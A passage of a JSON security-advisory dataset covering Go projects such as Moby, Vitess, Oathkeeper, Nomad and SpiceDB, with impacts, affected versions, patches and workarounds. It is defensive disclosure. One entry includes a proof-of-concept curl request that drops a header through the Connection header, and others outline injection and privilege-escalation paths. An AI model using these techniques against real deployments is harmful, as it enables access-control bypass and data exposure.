"0.3.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/metal3-io/baremetal-operator/security/advisories/GHSA-9wh7-397j-722m"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-30841"}, {"type": "WEB", "url": "https://github.com/metal3-io/baremetal-operator/pull/1241"}, {"type": "PACKAGE", "url": "https://github.com/metal3-io/baremetal-operator"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-319"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-04-26T19:46:00Z", "nvd_published_at": "2023-04-26T19:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-735r-hv67-g38f", "modified": "2023-04-14T21:34:56Z", "published": "2023-04-11T21:12:42Z", "aliases": ["CVE-2023-29194"], "summary": "vitess allows users to create keyspaces that can deny access to already existing keyspaces", "details": "### Impact\nUsers can either intentionally or inadvertently create a keyspace containing `/` characters such that from that point on, anyone who tries to view keyspaces from VTAdmin will receive an error. Trying to list all the keyspaces using `vtctldclient GetKeyspaces` will also return an error.\nNote that all other keyspaces can still be administered using the CLI (vtctldclient).\n\n### Patches\nv16.0.1 (corresponding to 0.16.1 on pkg.go.dev)\n\n### Workarounds\nDelete the offending keyspace using a CLI client (vtctldclient) \n```\nvtctldclient --server ... DeleteKeyspace a/b\n```\n\nFound during a security audit sponsored by the [CNCF](https://cncf.io) and facilitated by [OSTIF](https://ostif.org).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "vitess.io/vitess"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.16.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/vitessio/vitess/security/advisories/GHSA-735r-hv67-g38f"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-29194"}, {"type": "WEB", "url": "https://github.com/vitessio/vitess/commit/adf10196760ad0b3991a7aa7a8580a544e6ddf88"}, {"type": "PACKAGE", "url": "https://github.com/vitessio/vitess"}, {"type": "WEB", "url": "https://github.com/vitessio/vitess/commits/v0.16.1/"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-703"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-04-11T21:12:42Z", "nvd_published_at": "2023-04-14T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-232p-vwff-86mp", "modified": "2023-04-05T23:16:22Z", "published": "2023-04-04T21:13:06Z", "aliases": ["CVE-2023-28840"], "summary": "Docker Swarm encrypted overlay network may be unauthenticated", "details": "[Moby](https://mobyproject.org/) is an open source container framework developed by Docker Inc. that is distributed as Docker, Mirantis Container Runtime, and various other downstream projects/products. The Moby daemon component (`dockerd`), which is developed as [moby/moby](https://github.com/moby/moby) is commonly referred to as *Docker*.\n\nSwarm Mode, which is compiled in and delivered by default in `dockerd` and is thus present in most major Moby downstreams, is a simple, built-in container orchestrator that is implemented through a combination of [SwarmKit](https://github.com/moby/swarmkit) and supporting network code.\n\nThe `overlay` network driver is a core feature of Swarm Mode, providing isolated virtual LANs that allow communication between containers and services across the cluster. This driver is an implementation/user of [VXLAN](https://en.wikipedia.org/wiki/Virtual_Extensible_LAN), which encapsulates link-layer (Ethernet) frames in UDP datagrams that tag the frame with a VXLAN Network ID (VNI) that identifies the originating overlay network. In addition, the overlay network driver supports an optional, off-by-default encrypted mode, which is especially useful when VXLAN packets traverses an untrusted network between nodes.\n\nEncrypted overlay networks function by encapsulating the VXLAN datagrams through the use of the [IPsec Encapsulating Security Payload](https://en.wikipedia.org/wiki/IPsec#Encapsulating_Security_Payload) protocol in [Transport mode](https://en.wikipedia.org/wiki/IPsec#Transport_mode). By deploying IPSec encapsulation, encrypted overlay networks gain the additional properties of source authentication through cryptographic proof, data integrity through check-summing, and confidentiality through encryption.\n\nWhen setting an endpoint up on an encrypted overlay network, Moby installs three [iptables](https://www.netfilter.org/projects/iptables/index.html) (Linux kernel firewall) rules that enforce both incoming and outgoing IPSec. These rules rely on the `u32` iptables extension provided by the `xt_u32` kernel module to directly filter on a VXLAN packet's VNI field, so that IPSec guarantees can be enforced on encrypted overlay networks without interfering with other overlay networks or other users of VXLAN.\n\n[Two iptables rules](https://github.com/moby/libnetwork/blob/d9fae4c73daf76c3b0f77e14b45b8bf612ba764d/drivers/overlay/encryption.go#L230-L234) serve to filter incoming VXLAN datagrams with a VNI that corresponds to an encrypted network and discards unencrypted datagrams. The rules are appended to the end of the `INPUT` filter chain, following any rules that have been previously set by the system administrator. Administrator-set rules take precedence over the rules Moby sets to discard unencrypted VXLAN datagrams, which can potentially admit unencrypted datagrams that should have been discarded.\n\nOn Red Hat Enterprise Linux and derivatives such as CentOS and Rocky, the `xt_u32` module has been:\n* [moved to the kernel-modules-extra package and no longer installed by default in RHEL 8.3](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/8.3_release_notes/rhel-8-3-0-release#technology-preview_networking)\n* [officially deprecated in RHEL 8.6](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/8.6_release_notes/deprecated_functionality#deprecated-functionality_networking)\n* [removed completely in RHEL 9](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9/html/considerations_in_adopting_rhel_9/assembly_networking_considerations-in-adopting-rhel-9#ref_firewall-networking_assembly_networking)\n\nThese rules are not created when `xt_u32` is unavailable, even though the container is still attached to the network.\n\n## Impact\nEncrypted overlay networks on affected configurations silently accept cleartext VXLAN datagrams that are tagged with the VNI of an encrypted overlay network. As a result, it is possible to inject arbitrary Ethernet frames into the encrypted overlay network by encapsulating them in VXLAN datagrams.\n\nThe injection of arbitrary Ethernet frames can enable a Denial of Service attack. A sophisticated attacker may be able to establish a UDP or TCP connection by way of the container\u2019s outbound gateway that would otherwise be blocked by a stateful firewall, or carry out other escalations beyond simple injection by smuggling packets into the overlay network.\n\n## Patches\nPatches are available in Moby releases 23.0.3, and 20.10.24. As Mirantis Container Runtime's 20.10 releases are numbered differently, users of that platform should update to 20.10.16.\n\n## Workarounds\n* Close the VXLAN port (by default, UDP port 4789) to incoming traffic at the Internet boundary (see [GHSA-vwm3-crmr-xfxw](https://github.com/moby/moby/security/advisories/GHSA-vwm3-crmr-xfxw)) to prevent all VXLAN packet injection.\n* Ensure that the `xt_u32` kernel module is available on all nodes of the Swarm cluster.\n\n## Background\n* [#43382](https://github.com/moby/moby/issues/43382) partially discussed this concern, but did not consider the security implications.\n* Mirantis FIELD-5788 essentially duplicates [#43382](https://github.com/moby/moby/issues/43382), and was created six months earlier; it similarly overlooked the security implications.\n* [#45118](https://github.com/moby/moby/pull/45118) is the ancestor of the final patches, and was where the security implications were discovered.\n\n## Related\n* [CVE-2023-28841: Encrypted overlay network traffic may be unencrypted](https://github.com/moby/moby/security/advisories/GHSA-33pg-m6jh-5237)\n* [CVE-2023-28842: Encrypted overlay network with a single endpoint is unauthenticated](https://github.com/moby/moby/security/advisories/GHSA-6wrf-mxfj-pf5p)\n* [GHSA-vwm3-crmr-xfxw: The Swarm VXLAN port may be exposed to attack due to ambiguous documentation](https://github.com/moby/moby/security/advisories/GHSA-vwm3-crmr-xfxw)\n* [GHSA-gvm4-2qqg-m333: Security issues in encrypted overlay networks](https://github.com/moby/libnetwork/security/advisories/GHSA-gvm4-2qqg-m333) (libnetwork)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/docker/docker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.12.0"}, {"fixed": "20.10.24"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/docker/docker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "23.0.0"}, {"fixed": "23.0.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/moby/libnetwork/security/advisories/GHSA-gvm4-2qqg-m333"}, {"type": "WEB", "url": "https://github.com/moby/moby/security/advisories/GHSA-232p-vwff-86mp"}, {"type": "WEB", "url": "https://github.com/moby/moby/security/advisories/GHSA-33pg-m6jh-5237"}, {"type": "WEB", "url": "https://github.com/moby/moby/security/advisories/GHSA-6wrf-mxfj-pf5p"}, {"type": "WEB", "url": "https://github.com/moby/moby/security/advisories/GHSA-vwm3-crmr-xfxw"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28840"}, {"type": "WEB", "url": "https://github.com/moby/moby/issues/43382"}, {"type": "WEB", "url": "https://github.com/moby/moby/pull/45118"}, {"type": "PACKAGE", "url": "https://github.com/moby/moby"}], "database_specific": {"cwe_ids": ["CWE-420", "CWE-636"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-04-04T21:13:06Z", "nvd_published_at": "2023-04-04T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-939c-3g97-vpvv", "modified": "2023-05-09T20:30:35Z", "published": "2023-04-26T00:30:21Z", "aliases": ["CVE-2023-26735"], "summary": "Access control issues in blackbox_exporter", "details": "blackbox_exporter v0.23.0 was discovered to contain an access control issue in its probe interface. This vulnerability allows attackers to detect intranet ports and services, as well as download resources.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/prometheus/blackbox_exporter"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.23.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-26735"}, {"type": "WEB", "url": "https://github.com/prometheus/blackbox_exporter/issues/1024"}, {"type": "WEB", "url": "https://github.com/prometheus/blackbox_exporter/issues/1025"}, {"type": "WEB", "url": "https://github.com/prometheus/blackbox_exporter/issues/1026"}, {"type": "PACKAGE", "url": "https://github.com/prometheus/blackbox_exporter"}, {"type": "WEB", "url": "https://github.com/prometheus/blackbox_exporter#tls-and-basic-authentication"}, {"type": "WEB", "url": "http://blackboxexporter.com"}, {"type": "WEB", "url": "http://prometheus.com"}], "database_specific": {"cwe_ids": ["CWE-918"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-04-26T15:56:45Z", "nvd_published_at": "2023-04-26T00:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-w9mr-28mw-j8hg", "modified": "2023-04-27T15:52:24Z", "published": "2023-04-26T19:44:00Z", "aliases": [], "summary": "Hop-by-hop abuse to malform header mutator", "details": "### Impact\n\nDownstream services relying on the presence of headers set by the `header` mutator could be exploited. A client can drop the header set by the `header` mutator by including that header's name in the `Connection` header. Example minimal config:\n\n```yaml\n- id: 'example'\n  upstream:\n    url: 'https://example.com'\n  match:\n    url: 'http://127.0.0.1:4455/'\n    methods:\n      - GET\n  authenticators:\n    - handler: anonymous\n  authorizer:\n    handler: allow\n  mutators:\n    - handler: header\n      config:\n        headers:\n          X-Subject: {{ .Subject }}\n```\n\n```\ncurl -H \"Connection: close,x-subject\" http://127.0.0.1:4455/\n```\n\nThe `X-Subject` header will not arrive at the downstream server. It is completely dropped. In case the downstream server handles such a request in an unexpected way, an attacker can exploit this, assuming they know or guess the internal header name.\n\n### Patches\n\nc5cc7f736dc84185034be4356057d1c7a656d797\n\n### Workarounds\n\nThe downstream server should handle the case that an expected header is not set by responding with an appropriate error.\n\n### References\n\nSee background info in https://github.com/golang/go/issues/50580", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ory/oathkeeper"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.40.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ory/oathkeeper/security/advisories/GHSA-w9mr-28mw-j8hg"}, {"type": "PACKAGE", "url": "https://github.com/ory/oathkeeper"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-04-26T19:44:00Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-f8r8-h93m-mj77", "modified": "2023-04-06T16:59:26Z", "published": "2023-04-05T21:30:24Z", "aliases": ["CVE-2023-1782"], "summary": "HashiCorp Nomad vulnerable to unauthenticated client agent HTTP request privilege escalation", "details": "HashiCorp Nomad and Nomad Enterprise versions 1.5.0 up to 1.5.2 allow unauthenticated users to bypass intended ACL authorizations for clusters where mTLS is not enabled. This issue is fixed in version 1.5.3.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.5.0"}, {"fixed": "1.5.3"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.5.2"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1782"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2023-12-nomad-unauthenticated-client-agent-http-request-privilege-escalation/52375"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/nomad"}], "database_specific": {"cwe_ids": ["CWE-285", "CWE-862"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-04-06T16:59:26Z", "nvd_published_at": "2023-04-05T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-f6xp-59jq-r35c", "modified": "2023-04-10T22:51:35Z", "published": "2023-04-04T15:30:28Z", "aliases": ["CVE-2020-19278"], "summary": "Phachon mm-wiki Cross Site Request Forgery vulnerability", "details": "Cross Site Request Forgery vulnerability found in Phachon mm-wiki v.0.1.2 allows a remote attacker to execute arbitrary code via the system/user/save parameter.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/phachon/mm-wiki"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.1.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-19278"}, {"type": "WEB", "url": "https://github.com/phachon/mm-wiki/issues/68"}, {"type": "PACKAGE", "url": "https://github.com/phachon/mm-wiki"}, {"type": "WEB", "url": "https://imgur.com/EABvnwz"}], "database_specific": {"cwe_ids": ["CWE-352"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-04-10T22:51:35Z", "nvd_published_at": "2023-04-04T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cjr9-mr35-7xh6", "modified": "2023-04-14T21:35:43Z", "published": "2023-04-13T17:53:38Z", "aliases": ["CVE-2023-29193"], "summary": "SpiceDB binding metrics port to untrusted networks and can leak command-line flags", "details": "### Background\n\nThe `spicedb serve` command contains a flag named `--grpc-preshared-key` which is used to protect the gRPC API from being accessed by unauthorized requests. The values of this flag are to be considered sensitive, secret data.\n\nThe `/debug/pprof/cmdline` endpoint served by the metrics service (defaulting running on port `9090`) reveals the command-line flags provided for debugging purposes. If a password is set via the `--grpc-preshared-key` then the key is revealed by this endpoint along with any other flags provided to the SpiceDB binary.\n\n### Impact\n\nAll deployments abiding by the recommended best practices for production usage are **NOT affected**:\n- Authzed's SpiceDB Serverless\n- Authzed's SpiceDB Dedicated\n- SpiceDB Operator\n\nUsers configuring SpiceDB via environment variables are **NOT affected**.\n\nUsers **MAY be affected** if they expose their metrics port to an untrusted network and are configuring `--grpc-preshared-key` via command-line flag.\n\n### Workarounds\n\nTo workaround this issue you can do one of the following:\n\n- Configure the preshared key via an environment variable (e.g. `SPICEDB_GRPC_PRESHARED_KEY=yoursecret spicedb serve`)\n- Reconfigure the `--metrics-addr` flag to bind to a trusted network (e.g. `--metrics-addr=localhost:9090`)\n- Disable the metrics service via the flag (e.g. `--metrics-enabled=false`)\n- Adopt one of the recommended deployment models: [Authzed's managed services](https://authzed.com/pricing) or the [SpiceDB Operator](https://github.com/authzed/spicedb-operator)\n\n### References\n\n- [GitHub Security Advisory issued for SpiceDB](https://github.com/authzed/spicedb/security/advisories/GHSA-cjr9-mr35-7xh6)\n- [Go issue #22085](https://github.com/golang/go/issues/22085) for documenting the risks of exposing pprof to the internet\n- [Go issue #42834](https://github.com/golang/go/issues/42834) discusses preventing pprof registration to the default serve mux\n- [semgrep rule go.lang.security.audit.net.pprof.pprof-debug-exposure](https://semgrep.dev/r?q=go.lang.security.audit.net.pprof) checks for a variation of this issue", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/authzed/spicedb"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.19.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/authzed/spicedb/security/advisories/GHSA-cjr9-mr35-7xh6"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-29193"}, {"type": "WEB", "url": "https://github.com/authzed/spicedb/commit/9bbd7d76b6eaba33fe0236014f9b175d21232999"}, {"type": "PACKAGE", "url": "https://github.com/authzed/spicedb"}, {"type": "WEB", "url": "https://github.com/authzed/spicedb/releases/tag/v1.19.1"}], "database_specific": {"cwe_ids": ["CWE-209"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-04-13T17:53:38Z", "nvd_published_at": "2023-04-14T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7hj9-rv74-5g92", "modified": "2023-04-25T21:00:36Z", "published": "2023-04-11T20:59:22Z", "aliases": ["CVE-2023-29013"], "summary": "Traefik HTTP header parsing could cause a denial of service ", "details": "### Impact\n\nThere is a vulnerability in [Go when parsing the HTTP headers](https://groups.google.com/g/golang-announce/c/Xdv6JL9ENs8/m/OV40vnafAwAJ), which impacts Traefik.\nHTTP header parsing could allocate substantially more memory than required to hold the parsed headers. This behavior could be exploited to cause a denial of service.\n\n### References\n\n- [CVE-2023-24534](https://www.cve.org/CVERecord?id=CVE-2023-24534)\n\n### Patches\n- https://github.com/traefik/traefik/releases/tag/v2.9.10\n- https://github.com/traefik/traefik/releases/tag/v2.10.0-rc2\n\n### Workarounds\n\nNo workaround.\n\n### For more information\n\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.9.10"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.10.0-rc1"}, {"fixed": "2.10.0-rc2"}]}], "versions": ["2.10.0-rc1"]}], "references": [{"type": "WEB", "url": "https://github.com/traefik/traefik/security/advisories/GHSA-7hj9-rv74-5g92"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-29013"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/commit/4ed3964b3586565519249bbdc55eb1b961c08c49"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-8v5j-pwr7-w5f8"}, {"type": "PACKAGE", "url": "https://github.com/traefik/traefik"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/releases/tag/v2.10.0-rc2"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/releases/tag/v2.9.10"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce/c/Xdv6JL9ENs8/m/OV40vnafAwAJ"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20230517-0008/"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-04-11T20:59:22Z", "nvd_published_at": "2023-04-14T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cwf6-xj49-wp83", "modified": "2023-04-25T16:34:37Z", "published": "2023-04-12T20:40:38Z", "aliases": ["CVE-2023-29018"], "summary": " OpenFeature Operator vulnerable to Cluster-level Privilege Escalation", "details": "### Impact\n\nOn a node controlled by an attacker or malicious user, the lax permissions configured on `open-feature-operator-controller-manager` can be used to further escalate the privileges of any service account in the cluster.\n\nThe increased privileges could be used to modify cluster state, leading to DoS, or read sensitive data, including secrets.\n\n### Patches\n\nThe patch mitigates this issue by restricting the resources the `open-feature-operator-controller-manager` can modify.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/open-feature/open-feature-operator"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.2.32"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/open-feature/open-feature-operator/security/advisories/GHSA-cwf6-xj49-wp83"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-29018"}, {"type": "PACKAGE", "url": "https://github.com/open-feature/open-feature-operator"}, {"type": "WEB", "url": "https://github.com/open-feature/open-feature-operator/releases/tag/v0.2.32"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-04-12T20:40:38Z", "nvd_published_at": "2023-04-14T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-j97g-77fj-9c4p", "modified": "2023-04-21T17:50:30Z", "published": "2023-04-11T12:30:25Z", "aliases": ["CVE-2023-1976"], "summary": "Answer vulnerable to account takeover because password reset links do not expire", "details": "answerdev/answer is an open-source knowledge-based community software. Answer prior to 1.0.6 is vulnerable to account takeover because the password reset link does not expire.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1976"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/813ad0b9894673b1bdd489a2e9ab60a44fe990af"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/469bcabf-b315-4750-b63c-82ac86d153de"}], "database_specific": {"cwe_ids": ["CWE-263"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-04-11T21:31:01Z", "nvd_published_at": "2023-04-11T11:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-33pg-m6jh-5237", "modified": "2023-04-05T23:16:54Z", "published": "2023-04-04T21:12:20Z", "aliases": ["CVE-2023-28841"], "summary": "Docker Swarm encrypted overlay network traffic may be unencrypted", "details": "[Moby](https://mobyproject.org/) is an open source container framework developed by Docker Inc. that is distributed as Docker, Mirantis Container Runtime, and various other downstream projects/products. The Moby daemon component (`dockerd`), which is developed as [moby/moby](https://github.com/moby/moby) is commonly referred to as *Docker*.\n\nSwarm Mode, which is compiled in and delivered by default in `dockerd` and is thus present in most major Moby downstreams, is a simple, built-in container orchestrator that is implemented through a combination of [SwarmKit](https://github.com/moby/swarmkit) and supporting network code.\n\nThe `overlay` network driver is a core feature of Swarm Mode, providing isolated virtual LANs that allow communication between containers and services across the cluster. This driver is an implementation/user of [VXLAN](https://en.wikipedia.org/wiki/Virtual_Extensible_LAN), which encapsulates link-layer (Ethernet) frames in UDP datagrams that tag the frame with a VXLAN Network ID (VNI) that identifies the originating overlay network. In addition, the overlay network driver supports an optional, off-by-default encrypted mode, which is especially useful when VXLAN packets traverses an untrusted network between nodes.\n\nEncrypted overlay networks function by encapsulating the VXLAN datagrams through the use of the [IPsec Encapsulating Security Payload](https://en.wikipedia.org/wiki/IPsec#Encapsulating_Security_Payload) protocol in [Transport mode](https://en.wikipedia.org/wiki/IPsec#Transport_mode). By deploying IPSec encapsulation, encrypted overlay networks gain the additional properties of source authentication through cryptographic proof, data integrity through check-summing, and confidentiality through encryption.\n\nWhen setting an endpoint up on an encrypted overlay network, Moby installs three [iptables](https://www.netfilter.org/projects/iptables/index.html) (Linux kernel firewall) rules that enforce both incoming and outgoing IPSec. These rules rely on the `u32` iptables extension provided by the `xt_u32` kernel module to directly filter on a VXLAN packet's VNI field, so that IPSec guarantees can be enforced on encrypted overlay networks without interfering with other overlay networks or other users of VXLAN.\n\nAn [iptables rule](https://github.com/moby/libnetwork/blob/d9fae4c73daf76c3b0f77e14b45b8bf612ba764d/drivers/overlay/encryption.go#L205-L207) designates outgoing VXLAN datagrams with a VNI that corresponds to an encrypted overlay network for IPsec encapsulation.\n\nOn Red Hat Enterprise Linux and derivatives such as CentOS and Rocky, the `xt_u32` module has been:\n* [moved to the kernel-modules-extra package and no longer installed by default in RHEL 8.3](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/8.3_release_notes/rhel-8-3-0-release#technology-preview_networking)\n* [officially deprecated in RHEL 8.6](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/8.6_release_notes/deprecated_functionality#deprecated-functionality_networking)\n* [removed completely in RHEL 9](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9/html/considerations_in_adopting_rhel_9/assembly_networking_considerations-in-adopting-rhel-9#ref_firewall-networking_assembly_networking)\n\nThis rule is not created when `xt_u32` is unavailable, even though the container is still attached to the network.\n\n## Impact\nEncrypted overlay networks on affected platforms silently transmit unencrypted data. As a result, `overlay` networks may appear to be functional, passing traffic as expected, but without any of the expected confidentiality or data integrity guarantees.\n\nIt is possible for an attacker sitting in a trusted position on the network to read all of the application traffic that is moving across the overlay network, resulting in unexpected secrets or user data disclosure. Thus, because many database protocols, internal APIs, etc. are not protected by a second layer of encryption, a user may rely on Swarm encrypted overlay networks to provide confidentiality, which due to this vulnerability is no longer guaranteed.\n\n## Patches\nPatches are available in Moby releases 23.0.3, and 20.10.24. As Mirantis Container Runtime's 20.10 releases are numbered differently, users of that platform should update to 20.10.16.\n\n## Workarounds\n* Close the VXLAN port (by default, UDP port 4789) to outgoing traffic at the Internet boundary (see [GHSA-vwm3-crmr-xfxw](https://github.com/moby/moby/security/advisories/GHSA-vwm3-crmr-xfxw)) in order to prevent unintentionally leaking unencrypted traffic over the Internet.\n* Ensure that the `xt_u32` kernel module is available on all nodes of the Swarm cluster.\n\n## Background\n* [#43382 ](https://github.com/moby/moby/issues/43382)partially discussed this concern, but did not consider the security implications.\n* Mirantis FIELD-5788 essentially duplicates [#43382](https://github.com/moby/moby/issues/43382), and was created six months earlier; it similarly overlooked the security implications.\n* [#45118](https://github.com/moby/moby/pull/45118) is the ancestor of the final patches, and was where the security implications were discovered.\n\n## Related\n* [CVE-2023-28840: Encrypted overlay network may be unauthenticated](https://github.com/moby/moby/security/advisories/GHSA-232p-vwff-86mp)\n* [CVE-2023-28842: Encrypted overlay network with a single endpoint is unauthenticated](https://github.com/moby/moby/security/advisories/GHSA-6wrf-mxfj-pf5p)\n* [GHSA-vwm3-crmr-xfxw: The Swarm VXLAN port may be exposed to attack due to ambiguous documentation](https://github.com/moby/moby/security/advisories/GHSA-vwm3-crmr-xfxw)\n* [GHSA-gvm4-2qqg-m333: Security issues in encrypted overlay networks](https://github.com/moby/libnetwork/security/advisories/GHSA-gvm4-2qqg-m333) (libnetwork)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/docker/docker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.12.0"}, {"fixed": "20.10.24"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/docker/docker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "23.0.0"}, {"fixed": "23.0.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/moby/libnetwork/security/advisories/GHSA-gvm4-2qqg-m333"}, {"type": "WEB", "url": "https://github.com/moby/moby/security/advisories/GHSA-232p-vwff-86mp"}, {"type": "WEB", "url": "https://github.com/moby/moby/security/advisories/GHSA-33pg-m6jh-5237"}, {"type": "WEB", "url": "https://github.com/moby/moby/security/advisories/GHSA-6wrf-mxfj-pf5p"}, {"type": "WEB", "url": "https://github.com/moby/moby/security/advisories/GHSA-vwm3-crmr-xfxw"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28841"}, {"type": "WEB", "url": "https://github.com/moby/moby/issues/43382"}, {"type": "WEB", "url": "https://github.com/moby/moby/pull/45118"}, {"type": "WEB", "url": "https://github.com/moby/libnetwork/blob/d9fae4c73daf76c3b0f77e14b45b8bf612ba764d/drivers/overlay/encryption.go#L205-L207"}, {"type": "PACKAGE", "url": "https://github.com/moby/moby"}], "database_specific": {"cwe_ids": ["CWE-311", "CWE-636"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-04-04T21:12:20Z", "nvd_published_at": "2023-04-04T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gmph-wf7j-9gcm", "modified": "2023-04-11T21:32:54Z", "published": "2023-04-04T15:30:27Z", "aliases": ["CVE-2021-28235"], "summary": "Etcd-io Improper Authentication vulnerability", 